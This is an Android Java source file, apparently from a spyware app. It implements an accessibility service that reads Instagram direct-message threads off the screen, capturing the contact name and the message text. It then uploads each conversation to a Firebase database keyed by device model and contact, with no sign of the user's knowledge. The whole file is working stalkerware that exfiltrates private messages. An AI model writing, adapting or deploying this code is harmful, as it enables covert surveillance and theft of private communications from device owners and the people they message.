package in.spyapp.patanjali.android;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONArray;

import java.util.ArrayList;
import java.util.HashMap;

public class AccessServiceInsta extends AccessibilityService {

    private HashMap<String, ArrayList <String>> conv;


    private ArrayList<String> sent;

    boolean saveOn = false;
    ArrayList<String> t;



    public AccessServiceInsta() {
        conv = new HashMap();
        sent = new ArrayList<String>();
    }

    public void processChild(AccessibilityNodeInfo source)
    {
        if(source == null)
        {
            Log.d("return", "for null");
            return;
        }
        //      Log.d("source in str", source.toString());
        Integer currentChild = source.getChildCount();
        if(currentChild>0)
        {
            for(Integer i=0; i<currentChild; i++)
            {
                processChild(source.getChild(i));
            }
        } else
        {
           Log.d("source class name", source.getClassName().toString());

           if(source.getClassName().toString().equals("android.widget.EditText"))
               Log.d("text source", source.getText().toString());

            if (source.getClassName().equals("android.widget.TextView") && source.getText()!=null && !source.getText().toString().isEmpty()) {
                try {
                    Log.d("Notable Text", "" + source.getText());
                    t.add(""+source.getText().toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            if (source.getClassName().equals("android.widget.EditText") && source.getText()!=null && !source.getText().toString().isEmpty()  && source.getText().toString().toLowerCase().equals("message...")) {
                try {
                    Log.d("Notable Text THIS FINAL", "" + source.getText());
                    saveOn = true;
                } catch (Exception e) {
                    e.printStackTrace();

                }
            } else{
                Log.d("save on", "off");
            }
        }
    }


    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        return model;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        //Log.d("access","got it");
        try{

            t = new ArrayList<String>();
            saveOn = false;

            AccessibilityNodeInfo source = accessibilityEvent.getSource();
            if (source == null) {
                Log.d("return", "for null");
                return;
            }



            Log.d("Source Count", String.valueOf(source.getChildCount()));
/*
        if (source.getClassName().equals("android.widget.TextView") && source.getText()!=null && !source.getText().toString().isEmpty())
        {
            // here level is iteration of for loop
            Log.d("Notable Text", ""+source.getText());
        }
*/
            processChild(source);

            if(saveOn == true)
            {
                if(t.size()>0)
                {


                    String person = new String();
                    person = t.get(0);
                    Log.d("person set", person);
                    t.remove(0);
                    ArrayList<String> messagesToSave = new ArrayList<>();

                    if (conv != null && conv.containsKey(person)) {
                        ArrayList <String> messages = conv.get(person);
                        String lastMessageSaved = messages.get(messages.size()-1);

                        boolean startSaving = false;

                        for(Integer k=0; k<t.size(); k++)
                        {
                            if(t.get(k) == null)
                                continue;;

                            Log.d("current Processing", t.get(k));

                            if(startSaving == true)
                            {
                                messagesToSave.add(t.get(k));
                                Log.d("adding in saving list", "saving");
                            }
                            if(lastMessageSaved.equals(t.get(k)))
                            {
                                startSaving = true;
                            }
                        }
                        messages.addAll(messagesToSave);
                    }
                    else
                    {

                        for(Integer k=0; k<t.size(); k++)
                        {
                            if(t.get(k) == null)
                                continue;;

                            messagesToSave.add(t.get(k));
                        }
                        if(conv != null){
                            if(messagesToSave.size()>0)
                            conv.put(person, messagesToSave);

                        }
                    }






                    JSONArray json = new JSONArray(conv.get(person));
                    if(json.toString().length()>2){

                    if(!sent.contains(json.toString()))
                    {

                    Log.d("Saving to server"+person, json.toString());

                        try {

                            ArrayList<String> listdata = new ArrayList<String>();
                            if (json != null) {
                                for (int i=0;i<json.length();i++){
                                    listdata.add(json.getString(i));
                                }
                            }

                            FirebaseDatabase database = FirebaseDatabase.getInstance();
                        DatabaseReference myRef = database.getReference((getDeviceName() + " - Insta - " + person).replace(".","^"));
                        myRef.push().setValue(listdata);
                        }catch (Exception e)
                        {
                            e.printStackTrace();
                        }


                        sent.add(json.toString());
                    Log.d("Log ","Saved");

                    } else{
                        Log.d("ignoring","ignoring due to already sent");
                    }

                    }
                } else
                {
                    Log.d("Log ","NeedNotS");
                }

                //   Log.i("Event", accessibilityEvent.toString()+"");
                //Log.i("Source", source.toString());

            }


        }catch(Exception e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        Log.d("access", "service connected");
        // Set the type of events that this service wants to listen to. Others won't be passed to this service.
        // We are only considering windows state changed event.
        info.eventTypes = AccessibilityEvent.TYPE_WINDOWS_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        // If you only want this service to work with specific applications, set their package names here. Otherwise, when the service is activated, it will listen to events from all applications.
        info.packageNames = new String[] {"com.instagram.android"};
        // Set the type of feedback your service will provide. We are setting it to GENERIC.
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        // Default services are invoked only if no package-specific ones are present for the type of AccessibilityEvent generated.
        // This is a general-purpose service, so we will set some flags
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS; info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY; info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        // We are keeping the timeout to 0 as we don’t need any delay or to pause our accessibility events
        info.notificationTimeout = 0;
        this.setServiceInfo(info);
    }
}